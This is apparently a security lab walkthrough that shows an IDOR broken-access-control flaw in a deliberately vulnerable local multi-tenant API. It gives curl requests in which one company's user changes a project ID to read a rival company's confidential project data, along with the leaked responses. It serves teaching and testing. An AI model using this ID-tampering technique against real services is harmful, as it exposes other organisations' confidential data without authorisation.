## Prerequisites
First, ensure the vulnerable multi-tenant server is running with the following command:

```Bash

uvicorn vulnerable:app --reload
```
## Exploitation Steps
The goal is for an authenticated user from one company (Bob from InnovateCorp) to access a confidential project belonging to a different company (DataSolutions).

1. Access a Legitimate Resource
First, the attacker, Bob, logs in and accesses a project he is authorized to see (Project 101). This is a normal, legitimate action.

```Bash

curl -X GET "http://127.0.0.1:8000/projects/101" \
     -H "Authorization: Bearer token_de_bob_empresa1"
```

Expected Response:
The API correctly returns the project data, which belongs to his company (company_id: 1).

```JSON

{"company_id":1,"name":"Projeto Fênix","budget":50000}
```
2. Perform the Exploit (IDOR Attack)
Bob notices the API uses a simple integer ID (101) in the URL. He hypothesizes that other projects for other companies might have sequential or guessable IDs. He decides to try accessing project 201.

He sends the request using his own authentication token, but changes the ID in the URL to the one he wants to target.

```Bash

curl -X GET "http://127.0.0.1:8000/projects/201" \
     -H "Authorization: Bearer token_de_bob_empresa1"
```

3. Analyze the Result
Because the endpoint is vulnerable, the server finds project 201 and returns its data without checking if Bob's company_id matches the project's company_id.

Successful Exploit Response:

```JSON

{"company_id":2,"name":"Reestruturação do Big Data","budget":120000}
```
This response confirms the exploit was successful. The API has leaked confidential data (project name and budget) from DataSolutions (company_id: 2) to a user from a rival company, InnovateCorp (company_id: 1). This is a critical Broken Access Control failure.